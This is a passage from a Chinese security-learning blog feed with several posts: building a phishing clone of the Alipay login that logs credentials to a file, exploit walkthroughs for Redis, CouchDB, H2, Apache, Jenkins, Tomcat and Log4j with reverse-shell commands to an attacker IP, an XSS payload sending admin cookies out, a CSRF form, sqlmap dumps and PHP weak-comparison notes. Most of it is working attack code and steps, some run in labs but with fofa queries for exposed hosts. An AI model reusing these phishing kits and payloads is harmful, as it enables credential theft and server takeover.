Code打开下载好的html文件，接下来一步一步来修改下面准备好的前后端模板：\n在浏览器中使用F12定位到“邮箱地址/手机号”这个元素的id，这里是J-input-user 同理也分别找到密码输入框和登录按钮的id，是password_input和J-login-simulate-btn\n将收集到的信息填入到下面的前端脚本中 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;script\u0026gt; $(document).ready(function(){ //监听登录按钮事件 $(\u0026#39;#登录按钮id\u0026#39;).click(function(event){ //阻止默认的提交行为 event.preventDefault(); //获取用户名密码 var username = $(\u0026#39;#账号框id\u0026#39;).val(); var password = $(\u0026#39;#密码框id\u0026#39;).val(); console.log(username); console.log(password); //使用ajax发送到post.php $.post(\u0026#39;./post.php\u0026#39;,{loginname:username,loginpassword:password},function(response){ //console.log(response); alert(\u0026#34;您输入的密码错误，请重新登录\u0026#34;); window.location.replace(\u0026#34;密码错误后的跳转链接\u0026#34;); }); }); }); \u0026lt;/script\u0026gt; 将改好的代码插入到html源代码中有关账号/密码框的代码的下方，前端校验的上方（如果有）。\n再将这段引入js的代码插入到源代码中有关账号/密码框的代码的上方，为保险你也可以紧跟在\u0026lt;body\u0026gt;后面。 1 2 3 4 \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.7.1.js\u0026#34; integrity=\u0026#34;sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 在网站根目录中创建post.php文件，写入： 1 2 3 4 5 6 7 8 9 10 \u0026lt;?php $u = $_POST[\u0026#39;loginname\u0026#39;]; $p = $_POST[\u0026#39;loginpassword\u0026#39;]; $f = fopen(\u0026#39;data.txt\u0026#39;,\u0026#39;a+\u0026#39;); fwrite($f,$u.\u0026#39;----\u0026#39;.$p.\u0026#34;\\n\u0026#34;); fclose($f); ?\u0026gt; 网页伪造完毕。 下面我们假装受害者来访问网站：受害者填入手机号18888888888和密码mypassword，点击登陆后网页弹窗提示密码错误，随后跳转到真正的支付宝。\n服务端看到网站目录下生成了data.txt，里面有收集到的用户名和密码：\n懒人工具：goblin 哥布林 下载链接：https://pan.baidu.com/s/1SH6CysBDVECgblIM8IZMqQ?pwd=u6rw\n解压后运行会自动生成配置文件，打开它的goblin.yaml文件可以修改模仿的网站，访问每个网站上面的对应模仿地址即可查看效果。软件应该是采用本地代理转发加抓包的形式实现的，所以虽然对网页的模拟极为逼真（毕竟是代理原网页的），但是只要网页稍微有点防护就不行了，感兴趣自行尝试吧。\n以上的钓鱼网站搭建和开头的arp+dns欺骗配合食用更加哦。\n","date":"2026-01-27T19:44:30+08:00","permalink":"https://www.retr0.xyz/p/1.27-arp%E6%AC%BA%E9%AA%97%E5%92%8Ccs%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"1.27 arp欺骗和CS的使用"},{"content":" 安装vulfocus靶场，下载链接：https://pan.baidu.com/s/1wY6QmW5EmWaYm9u88nKF2w?pwd=d4ue\n并且下载服务器攻防工具：https://pan.baidu.com/s/1UxdruKscaAPK_DuSLQuhwg?pwd=qrwc\n启动靶场 登陆密码test123\n注： 靶场机ifconfig必须保证和攻击机网段一致（都开网桥或者都开NAT模式）\n终端执行\nsudo su\t输入登录密码\ndocker ps -a\n发现9bda的虚拟机\ndocker start 9bda\n开始实验 在攻击机的浏览器中访问靶场的ip\n使用用户名:密码admin:admin登录\n镜像管理\u0026ndash;镜像管理-一键同步\nredis系列服务\n默认端口6379\nfofa搜索 port=\u0026quot;6379\u0026quot; \u0026amp;\u0026amp; protocol=\u0026quot;redis\u0026quot;\nredis服务默认就是没有用户名和密码的\n找到服务攻防工具中的redis文件夹中的Another-Redis-Desktop-Manager并安装\nRedis：CVE-2022-0543 在vulfocus中搜索该环境并启动，根据弹窗中的IP和端口使用刚才安装的软件连接数据库\n在软件中打开命令行模式，输入以下漏洞代码：\n1 eval \u0026#39;local io_l = package.loadlib(\u0026#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\u0026#34;, \u0026#34;luaopen_io\u0026#34;); local io = io_l(); local f = io.popen(\u0026#34;id\u0026#34;, \u0026#34;r\u0026#34;); local res = f:read(\u0026#34;*a\u0026#34;); f:close(); return res\u0026#39; 0 Redis：CNVD-2015-07557 在服务攻防工具中的redis文件夹中找到redis-rogue-server-master(CNVD-2015-07557).zip复制到kali环境下解压，使用以下命令运行：\n1 2 chmod 777 -R ./* python3 redis-rogue-server.py --rhost 目标IP --rport 目标端口 --lhost 攻击端口 选择reverse shell反向连接\n192.168.0.106(攻击IP) 4444\t此时kali开nc -lvp 4444\n此时在nc可以使用一些Linux的命令\nRedis：CNVD-2019-21763 同样将redis-rogue-getshell(CNVD-2019-21763).zip转移到kali环境，使用以下命令运行：\n1 python3 redis-master.py -r 目标IP -p 目标端口 -L 攻击IP -P 8888 -f RedisModulesSDK/exp.so -c \u0026#34;id\u0026#34; Couchdb：CVE-2017-12635（权限绕过） 开源数据库，储存数据格式json，js查询语言\n数据库会开放3个端口，看谁会理你，就打谁\n1、先创建用户\n抓包并修改数据包\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 PUT /_users/org.couchdb.user:usertest1 HTTP/1.1 Host: 目标IP:端口 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json Content-Length: 108 { \u0026#34;type\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;usertest1\u0026#34;, \u0026#34;roles\u0026#34;: [\u0026#34;_admin\u0026#34;], \u0026#34;roles\u0026#34;: [], \u0026#34;password\u0026#34;: \u0026#34;usertest1\u0026#34; } 浏览器网页返回\u0026quot;ok\u0026quot;:true\n2、登录用户授权\nhttp://目标IP:端口/_utils/\n用户名密码\nusertest1:usertest1\nCouchdb：CVE-2017-12635（命令执行） 在服务攻防工具中的couchdb文件夹中找到couchdb.py，同样复制到Kali环境。\n编辑该脚本，编辑目标的ip和端口和自己的ip，例如:\n1 2 3 4 5 6 7 8 9 10 11 12 13 !/usr/bin/env python3 import requests import json import base64 from requests.auth import HTTPBasicAuth target = \u0026#39;http://目标IP:端口\u0026#39; command = rb\u0026#34;\u0026#34;\u0026#34;sh -i \u0026gt;\u0026amp; /dev/tcp/自己IP/9988 0\u0026gt;\u0026amp;1\u0026#34;\u0026#34;\u0026#34; version = 1 session = requests.session() session.headers = { # 以下省略 先用nc监听9988端口\nnc -lvp 9988\n再执行python couchdb.py\n此时目标会反弹shell到本地，可以在nc的终端页面执行命令\nh2database：CVE-2022-23221 漏洞一：未授权进入 在JDBC URL中填入：\n1 jdbc:h2:mem:test1;FORBID_CREATION=FALSE;IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;\\ 点击connect，直接进入了后台\n漏洞二：RCE执行反弹 在攻击机上创建文件h2database.sql，内容为：\n1 2 3 4 5 6 CREATE TABLE test ( id INT NOT NULL ); CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS \u0026#39;//javascript Java.type(\u0026#34;java.lang.Runtime\u0026#34;).getRuntime().exec(\u0026#34;bash -c {echo,base64编码后的反弹指令}|{base64,-d}|{bash,-i}\u0026#34;);\u0026#39;; #反弹指令示例：bash -i \u0026gt;\u0026amp; /dev/tcp/攻击IP/6666 0\u0026gt;\u0026amp;1 在当前文件夹中启动CMD，执行python -m http.server\n启动nc监听6666端口，nc -lvvp 6666\n在h2database的登录窗口的JDBC URL填入：\n1 jdbc:h2:mem:test1;FORBID_CREATION=FALSE;IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;INIT=RUNSCRIPT FROM \u0026#39;http://192.168.80.134:8000/h2database.sql\u0026#39;;\\ 点击connect，观察到nc上已经拿到了目标上的root终端。\nApache：CVE-2021-42013 攻击端用nc监听5566端口，nc -lvvp 5566\n使用hackbarPOST一段内容，同时用burp抓包\n修改数据包头（也就是第一行）：POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh\n修改下方的POST内容：\n1 echo;perl -e \u0026#39;use Socket;$i=\u0026#34;攻击IP\u0026#34;;$p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026#34;tcp\u0026#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDOUT,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDERR,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);exec(\u0026#34;/bin/sh -i\u0026#34;);};\u0026#39; Apache：CVE-2021-41773（目录穿越） fafa搜索server=\u0026quot;Apache/2.4.49\u0026quot;\nApache HTTP Server 2.4.49、2.4.50版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到Web目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。\n使用Kali执行下面的命令即可：\n1 curl -v --path-as-is \u0026#39;http://目标IP:端口/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\u0026#39; tomcat-pass-getshell：弱口令 配置不当导致后台弱口令，可通过上传jsp压缩包改名的war拿shell\n先爆破弱口令 后门压缩zip改war 上传war访问链接 打开网站，点击manageapp，用户名密码都是tomcat或者admin\n发现WAR file to deploy\n哥斯拉生成jsp木马(有效载荷是JavaDynamicPayload)，压缩为zip，改名为a1.war\n之后发现网站有一个/a1\n地址为http://目标IP:端口/a1/a1.jsp\n哥斯拉（ONE-FOX集成工具箱）连接即可（记得选相同的有效载荷）\ntomcat：CVE-2017-12615（文件上传） burp直接首页抓包，改为PUT，内容为从文件粘贴jsp木马的代码\nPUT /x.jsp/ PUT /xx.jsp%20\nPUT /xxx.jsp::$DATA\n之后木马就在http://目标IP:端口/xxx.jsp\njenkins：CVE-2018-1000861 在服务攻防\\jenkins\\CVE-2018-1000861创建shell.txt内容为：\n1 bash -i \u0026gt;\u0026amp; /dev/tcp/攻击IP/5566 0\u0026gt;\u0026amp;1 随后在同目录下执行\n1 2 python -m http.server 8888 python2 exp.py http://目标IP:端口/ \u0026#34;curl -o /tmp/1.sh http://攻击IP:8888/shell.txt\u0026#34; 此时目标的/tmp/1.sh有了\n攻击端使用nc监听nc -lvvp 5566\n接着在刚才的目录执行\n1 python2 exp.py http://192.168.142.129:62408/ \u0026#34;bash /tmp/1.sh\u0026#34; laravel：CVE-2021-3129（RCE） 要求：Laravel \u0026lt;= 8.4.2\n进入服务攻防\\Laravel\\CVE-2021-3129-main\n执行：\n1 python exp.py http://目标IP:端口 thinkphp #Thinkphp-3.X RCE-6.X RCE\nThinkPHP是一套开源的、基于PHP的轻量级Web应用开发框架\n综合工具：武器库-Thinkphp专检（3-6版本）\nCVE-2018-1002015 one-fox的thinkphp综合利用工具，地址写进去检测，可以检测出漏洞\n选择thinkphp5.0 rce，命令写whoami即可\nCNVD-2018-24942 one-fox的thinkphp综合利用工具，地址写进去检测，可以检测出漏洞\nstruts（s2） Apache Struts2框架是一个使用JavaEE网络应用程序的Web框架。\n可能存在OGNL表达注入扩展，从而造成远程代码执行，风险极大。\nfofa搜索app=\u0026quot;struts2\u0026quot;\nstruts2：CVE-2020-17530（ 代码执行 ） 要求： Apache Struts 2.0.0 - 2.5.25\n找到服务攻防\\struts2\\s2-062-main\n当前目录执行：\n1 python .\\s2-062.py --url http://目标IP:端口/ --cmd id 会出现信息\nSpring（目录遍历） 0.2.13之前版本存在路径遍历漏洞，攻击者可通过该缺陷读取系统任意文件。\n参考文献：https://blog.csdn.net/weixin_43165012/article/details/121152482\n如果是Linux服务器\nhttp://目标IP:端口/manage/log/view?filename=etc/passwd\u0026amp;base=../../../../../../\n如果是windows服务器\nhttp://目标IP:端口/manage/log/view?filename=/windows/win.ini\u0026amp;base=../../../../../../../\n退格是为了确保退到根目录\nSolr：CVE-2019-17558（命令执行） 主要基于HTTP和Apache Lucene实现的全文搜索服务器。\n历史漏洞：https://avd.aliyun.com/search?q=Solr\n黑盒特征：图标及端口8393\nfofa搜port=\u0026quot;8983\u0026quot; \u0026amp;\u0026amp; title=\u0026quot;Solr Admin\u0026quot;\n要求： Apache Solr 5.0.0版本至8.3.1\n找到服务攻防\\solr\\solr_rce-master\n1 2 3 python2 solr_rce.py http://目标IP:端口 id # 可以发现内容 python2 solr_rce.py http://目标IP:端口 \u0026#34;cat /etc/passwd\u0026#34; Solr：CVE-2021-27905（文件读取\u0026amp;SSRF） 全版本官方拒绝修复漏洞\n获取数据库名 1 http://目标IP:端口/solr/admin/cores?indexInfo=false\u0026amp;wt=json 可以获取status的name为demo\n访问触发 1 2 3 curl -i -s -k -X $\u0026#39;POST\u0026#39; \\ -H $\u0026#39;Content-Type: application/json\u0026#39; --data-binary $\u0026#39;{\\\u0026#34;set-property\\\u0026#34;:{\\\u0026#34;requestDispatcher.requestParsers.enableRemoteStreaming\\\u0026#34;:true}}\u0026#39; \\ $\u0026#39;http://目标IP:端口/solr/demo/config\u0026#39; 任意文件读取 1 curl -i -s -k \u0026#39;http://目标IP:端口/solr/demo/debug/dump?param=ContentStreams\u0026amp;stream.url=file:///etc/passwd\u0026#39; shiro：CVE-2016-4437(命令执行) ava安全框架，能够用于身份验证、授权、加密和会话管理。\n历史漏洞：https://avd.aliyun.com/search?q=Shiro\n黑盒特征：数据包cookie里面rememberMe\n利用one-fox工具箱中的shiro-attack工具。\n目标地址写http://目标IP:端口/\n请求头Abc: 123，post数据a=123\n爆破密钥kPH+bIxk5D2deZiIxcaaaA==\n爆破利用链和回显，发现common2和AllEcho\nlog4j：CVE-2021-44228（远程命令执行） Apache的一个开源项目，是一个基于Java的日志记录框架。\n历史漏洞：https://avd.aliyun.com/search?q=Log4j\n黑盒特征：盲打 会问蓝队攻击特征（关键词${jndi:rmi:///osutj8}）\n要求： Apache Log4j2 2.0 - 2.15.0-rc1\n在dnslog平台获取一个域名，制作payload\n1 ${jndi:ldap://域名} 将上面的payloadURL编码后拼接在http://目标IP:端口/hello?payload=之后并访问\n发现dnslog有响应，说明漏洞存在\n构造第二个payload\n1 bash -c \u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/攻击IP/5566 \u0026lt;\u0026amp;1\u0026#39; 使用base64编码后拼接在下面\n1 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \u0026#34;bash -c {echo,payload放在这里}|{base64,-d}|{bash,-i}\u0026#34; -A 攻击IP nc监听nc -lvvp 5566\n进入服务攻防\\log4j在当前目录执行上面拼接好的命令\n在命令行中返回的内容里选择tomcat 8+的地址作为payload，例如：\n1 2 Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath): rmi://192.168.80.134:1099/u8ebi9\t//这个是地址 拼接到下面的地址中\n1 http://192.168.80.151:42927/hello?payload=${jndi:插在这} 同样把payload=后面的内容进行URL编码后直接访问，发现nc中有目标的root身份终端。\n","date":"2026-01-26T19:02:23+08:00","permalink":"https://www.retr0.xyz/p/1.26-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","title":"1.26 漏洞复现"},{"content":"暴力破解进阶 基础部分请见1.6 其他基础web漏洞介绍\n四种模式的特点：\nsinper 针对单一变量爆破\nbattering ram 可以设置2个变量，paylaod同时赋值给2个变量\npitchfork 两个变量分别设置payload，并且一一对应\ncluster bomb 交叉攻击\n接下来打开pikachu靶场操作\n验证码绕过(on server) 虽然服务端会生成验证码，但是我们可以利用验证码的生命时长来重复利用一个验证码。\n所以直接抓包对密码部分进行字典爆破即可。\n验证码绕过(on client) 客户端验证验证码的防护能力约等于没有，所以哪怕你直接把数据包里vscode=xxx的部分删除直接爆破密码也可以\ntoken验证（重点） 特点：\n每次提交，都会随机给你一个token值，一次性的，一旦token不同绝对不让你重复验证 可以防御重复提交 token属于无状态，可以在不同网站之间服务之间共享 token本身无法暴力破解 但是查看页面源代码，可以看到\u0026lt;input name=\u0026quot;token\u0026quot; value=\u0026quot;776496975bb416f396451548395\u0026quot; type=\u0026quot;hidden\u0026quot;\u0026gt;这一部分，所以我们可以想办法调用每次服务端发给我们的token来对密码进行爆破。\nburp抓包，发送到intruder模式为pitch fork，把密码，和token做标记 到payload中，payload1使用密码字典， options中线程选择1，下面的grep extract（正则表达式），点add，点fetch response，搜索value，把引号内的内容（也就是token）框起来，点OK 下面的redirections，点always 回到payload，选2，选择Recurisive grep，在下面的地方写上当前token的值 记得把payload encoding的勾去掉，Start Attack. XSS盲打 打开pikachu靶场中Cross-Site Scripting(跨站攻击脚本)中的xss之盲打。\n前台地址：http://localhost/vul/xss/xssblind/xss_blind.php\n后台地址：http://localhost/vul/xss/xssblind/admin_login.php\n黑客端：\n打开nc ，监听自己的4444端口nc -lvp 4444 构造一个XSS盲打的代码 （重点） 1 \u0026lt;script\u0026gt;var img=document.createElement(\u0026#34;img\u0026#34;);img.src=\u0026#34;http://黑客IP:4444/cook?\u0026#34;+escape(document.cookie)+\u0026#34;\u0026amp;address?\u0026#34;+escape(window.location.href);\u0026lt;/script\u0026gt; 该段代码能够在管理员打开后台时获取其cookie(身份认证信息)和后台地址并发送到黑客的4444端口。\n将代码连同正常信息提交到留言板，并持续等待nc监听返回结果 获取到数据包，例如： 1 2 3 4 5 6 7 8 GET /cook?ant%5Buname%5D%3Dadmin%3B%20ant%5Bpw%5D%3D10470c3b4b1fed12c3baac014be15fac67c6e815%3B%20PHPSESSID%3Dge2lk6tk0k0ohc2p5ti73mf2d0\u0026amp;address?http%3A//localhost%3A81/vul/xss/xssblind/admin.php HTTP/1.1 Host: 127.0.0.1:4444 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Referer: http://localhost:81/vul/xss/xssblind/admin.php DNT: 1 Connection: close 取第一行中有用部分将其中URL编码进行解码提高可读性，也可以使用这个Python脚本一键处理：auto url-decode.py\n1 cook?ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=ge2lk6tk0k0ohc2p5ti73mf2d0\u0026amp;address?http://localhost:81/vul/xss/xssblind/admin.php 可以从中分离出cookie为：\n1 ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=ge2lk6tk0k0ohc2p5ti73mf2d0 后端网址为：http://localhost:81/vul/xss/xssblind/admin.php\n黑客访问这个后端网址时使用burp抓包，将刚才的cookie替换进去即可免密登录后台。\nCSRF跨站攻击 CSRF通常用于在用户不知情的情况下修改其信息，例如您根据某个网站修改个人信息的页面的表单写一段代码并隐藏在您自己的网站中（例如点击“点我中奖”后会向原网站提交修改用户名的表单），使用一些手段诱导用户访问您的网站并点击按钮，好处是利用用户自己的cookie从而绕过身份验证。\n不过现在您不用再手写隐藏表单，您可以在提交个人信息的界面用burp抓包，右键后点击 Engagement tools\u0026ndash; **Generate CSRF Poc ** 一键生成后复制html代码到本地自行修改。\n例如下面这段代码将会使得用户在点击按钮后性别被修改为直升机。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;html\u0026gt; \u0026lt;!-- CSRF PoC - generated by Burp Suite Professional --\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt;history.pushState(\u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;/\u0026#39;)\u0026lt;/script\u0026gt; \u0026lt;form action=\u0026#34;http://localhost:81/vul/csrf/csrfget/csrf_get_edit.php\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;sex\u0026#34; value=\u0026#34;Helicopter\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;phonenum\u0026#34; value=\u0026#34;15988767673\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;add\u0026#34; value=\u0026#34;nba\u0026amp;#32;lakes\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;kobe\u0026amp;#64;pikachu\u0026amp;#46;com\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;submit\u0026#34; value=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;点击中奖！\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; sql注入自动化 实际上就是各种类型sql注入的sqlmap教程\n打开pikachu靶场至SQL-Inject部分。\nLevel 1、2、4 1 2 3 4 python sqlmap.py -u \u0026#34;http://localhost/vul/sqli/sqli_id.php\u0026#34; --data \u0026#34;id=1\u0026amp;submit=%E6%9F%A5%E8%AF%A2\u0026#34; --current-db --batch --threads 10 python sqlmap.py -u \u0026#34;http://localhost/vul/sqli/sqli_id.php\u0026#34; --data \u0026#34;id=1\u0026amp;submit=%E6%9F%A5%E8%AF%A2\u0026#34; -D pikachu --tables --batch --threads 10 python sqlmap.py -u \u0026#34;http://localhost/vul/sqli/sqli_id.php\u0026#34; --data \u0026#34;id=1\u0026amp;submit=%E6%9F%A5%E8%AF%A2\u0026#34; -D pikachu -T users --columns --batch --threads 10 python sqlmap.py -u \u0026#34;http://localhost/vul/sqli/sqli_id.php\u0026#34; --data \u0026#34;id=1\u0026amp;submit=%E6%9F%A5%E8%AF%A2\u0026#34; -D pikachu -T users -C id,username,password --dump --batch --threads 10 搜索型注入（特别） 搜索型注入在常规闭合基础上还会使用%，要特别注意。\n1 2 3 4 猜测查询语句： select * from table1 where username like \u0026#39;% x %\u0026#39; 插入payload： select * from table1 where username like \u0026#39;% x%\u0026#39; union select 1,2,3 --+ %\u0026#39; insert注入 1 2 3 4 猜测insert语句： insert into table1(username,password,sex,phone,email,addr)values(\u0026#39;用户名\u0026#39;,\u0026#39;密码\u0026#39;,\u0026#39;性别\u0026#39;,\u0026#39;地址\u0026#39;,\u0026#39;住址\u0026#39;) 插入payload（注意使用了括号绕过，管道符包裹部分）： insert into table1(username,password,sex,phone,email,addr)values(\u0026#39;用户名\u0026#39;,\u0026#39;密码\u0026#39;,\u0026#39;性别\u0026#39;,\u0026#39;地址\u0026#39;,\u0026#39; |x \u0026#39; and extractvalue(1,concat(0x7e,(database()),0x7e))) #| \u0026#39;) update注入 先注册一个账号，进入到修改信息界面：\n1 2 3 4 猜测update语句： update table1 set sex=\u0026#39;11\u0026#39;,phone=\u0026#39;22\u0026#39;,email=\u0026#39;33\u0026#39;,addr=\u0026#39;44\u0026#39; where username=\u0026#39;retr0\u0026#39; 插入payload（管道符包裹部分）： update table1 set sex=\u0026#39;11\u0026#39;,phone=\u0026#39;22\u0026#39;,email=\u0026#39;33\u0026#39;,addr=\u0026#39;|44\u0026#39; and extractvalue(1,concat(0x7e,(database()),0x7e)) or \u0026#39;1\u0026#39;=\u0026#39;1 \u0026#39;| where username=\u0026#39;retr0\u0026#39; delete注入 1 python sqlmap.py -u \u0026#34;http://localhost/vul/sqli/sqli_del.php?id=69\u0026#34; --current-db --batch --threads 10 HTTP头注入/盲注/宽字节注入 详见1.22 SQL注入系列-2\n","date":"2026-01-25T17:28:35+08:00","permalink":"https://www.retr0.xyz/p/1.25-%E6%9B%B4%E5%A4%9A%E6%9A%B4%E7%A0%B4xsscsrf%E5%92%8Csql/","title":"1.25 更多暴破、XSS、CSRF和sql"},{"content":"弱类型比较漏洞 弱类型比较漏洞是 PHP 语言特有的逻辑漏洞，根源在于 弱等于运算符（==） 的特性：比较时不严格校验数据类型，会先自动将两侧数据转换为相同类型，再进行值比较，最终导致预期外的 “相等” 结果，可能被攻击者利用绕过认证、权限校验等关键逻辑。\n原理介绍 字符串 vs 数字比较 转换规则：PHP 会将字符串强制转换为数字，转换逻辑为：取字符串开头的数字部分（若开头非数字则转换为 0），忽略后续非数字字符。 1 2 3 4 5 \u0026#39;12\u0026#39; == 12; // true（字符串\u0026#34;12\u0026#34;转数字12，值相等） \u0026#39;12abc\u0026#39; == 12; // true（仅取开头数字12，忽略\u0026#34;abc\u0026#34;） \u0026#39;adm2n\u0026#39; == 0; // true（字符串开头非数字，转换为0） \u0026#39;0123\u0026#39; == 123; // true（前导0不影响数字转换结果） \u0026#39;abc123\u0026#39; == 0; // true（开头无数字，转0） 布尔值 vs 其他值比较 转换规则：布尔值true与任意非 0 值（含非空字符串、非 0 数字）相等；布尔值false仅与 0、空字符串等 “空值” 相等。 1 2 3 4 5 6 \u0026#39;way\u0026#39; == true; // true（非空字符串转布尔值true） \u0026#39;false\u0026#39; == true; // true（字符串\u0026#34;false\u0026#34;非空，转true） 234 == true; // true（非0数字转true） 0 == false; // true（0转false） \u0026#39;\u0026#39; == false; // true（空字符串转false） \u0026#39;0\u0026#39; == false; // true（字符串\u0026#34;0\u0026#34;转数字0，再转false） 重点：哈希值 vs 字符串 “0” 比较 转换规则：若哈希值（如 md5、sha1 结果）以0e开头，且后续字符全为数字，PHP 会将其当作 科学计数法（0 的任意次幂 = 0） 处理，与字符串 “0” 或数字 0 比较时结果为 true。 1 2 3 4 5 $str1 = \u0026#39;240610708\u0026#39;; // md5($str1) = \u0026#39;0e420233178946742799316739797882\u0026#39; md5($str1) == \u0026#39;0\u0026#39;; // true（哈希值以0e开头，按科学计数法解析为0） $str2 = \u0026#39;QNKCDZO\u0026#39;; // md5($str2) = \u0026#39;0e830400451993494058024219903391\u0026#39; md5($str2) == 0; // true（同理，解析为0） md5加密数组输出为NULL 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php if(isset($_GET[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;password\u0026#39;]) ){ if($_GET[\u0026#39;username\u0026#39; ] == $_GET[\u0026#39;password\u0026#39;]){ echo \u0026#39;false\u0026#39;; }else if(md5($_GET[\u0026#39;username\u0026#39;]) === md5($_GET[\u0026#39;password\u0026#39;])){ echo \u0026#39;flag is xxxxx\u0026#39; ; }else{ echo \u0026#39;nonono\u0026#39;; } } ?\u0026gt; 想要得到flag就必须传入参数使得username和password都是数组，这样可以使他们本身不弱相等的情况下MD5值又强相等（因为没有值）。\n传参：?username[]=1\u0026amp;password[]=2\n利用方法 登录认证绕过：若后台用$_POST['password'] == $correct_pwd校验，可构造password=12绕过$correct_pwd=\u0026quot;12abc\u0026quot;的校验。 哈希校验绕过：若用md5($input) == $admin_md5验证，可输入240610708（其 md5 以 0e 开头），绕过$admin_md5=\u0026quot;0\u0026quot;的校验。 权限逻辑绕过：若用$role == 1（1 为管理员角色），可输入role=1abc，因转换为 1 导致权限提升。 序列化与反序列化 前置知识：php的面向对象 语法示例：类和对象的定义 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php class People{ //定义类 //成员变量 public $name; public $age; public $job; //成员方法 function speak(){ echo \u0026#39;hello，我叫\u0026#39;.$this-\u0026gt;name.\u0026#39;，年龄\u0026#39;.$this-\u0026gt;age.\u0026#39;，我是一个\u0026#39;.$this-\u0026gt;job.\u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; //$this可类比python中的self，旨在访问当前类中的变量 } } $c1 = new People();\t//初始化对象 $c1-\u0026gt;name = \u0026#39;小明\u0026#39;; $c1-\u0026gt;age = 18; $c1-\u0026gt;job = \u0026#39;学生\u0026#39;; $c1-\u0026gt;speak(); ?\u0026gt; 魔术方法 构造函数__construct() 它在调用这个类初始化了一个对象时会自动执行。\n1 2 3 function __construct(){ echo \u0026#39;我被创造出来了\u0026lt;/br\u0026gt;\u0026#39;; } 析构函数__destruct() 当这个类没用了会被内存销毁，同时执行\n1 2 3 function __destruct(){ echo \u0026#39;我死了\u0026lt;/br\u0026gt;\u0026#39;; } 不知道叫什么__wakeup() 该函数会在反序列化时触发\n1 2 3 function __wkaeup(){ echo \u0026#39;我回来了，孩子们。\u0026#39;; } 其他方法 __toString\t反序列化的时候对象被输出在模板的时候调用\n__call\t调用不存在的方法的时候调用\n__invoke\t把一个对象当作函数使用的时候调用\n关于面向对象的补充 既然有公有的(public)成员变量，那么是否有私有的呢🤔？有的兄弟，有的。\n我们这里把age变量改为私有(private，不可继承)或保护(protected，可继承)或并预设一个量。\n此时就不能在初始化对象时重新设置它的年龄。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php class People{ //定义类 //成员变量 public $name; protected $age = 20; private $job; //成员方法 function speak(){ echo \u0026#39;hello，我叫\u0026#39;.$this-\u0026gt;name.\u0026#39;，年龄\u0026#39;.$this-\u0026gt;age.\u0026#39;，我是一个\u0026#39;.$this-\u0026gt;job.\u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; //$this可类比python中的self，旨在访问当前类中的变量 } } $c1 = new People();\t//初始化对象 $c1-\u0026gt;name = \u0026#39;小明\u0026#39;; $c1-\u0026gt;job = \u0026#39;学生\u0026#39;; $c1-\u0026gt;speak(); ?\u0026gt; 除非我们在类中定义一个成员方法(function) 专门用来修改这个私有变量，\n1 2 3 function setAge($age){\t//函数名字不固定，重要的是括号里的参数 $this-\u0026gt;age = $age; } 在初始化对象时调用这个方法即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?php class People{ //定义类 //成员变量 public $name; protected $age = 20; private $job = \u0026#39;学生\u0026#39;; //成员方法 function speak(){ echo 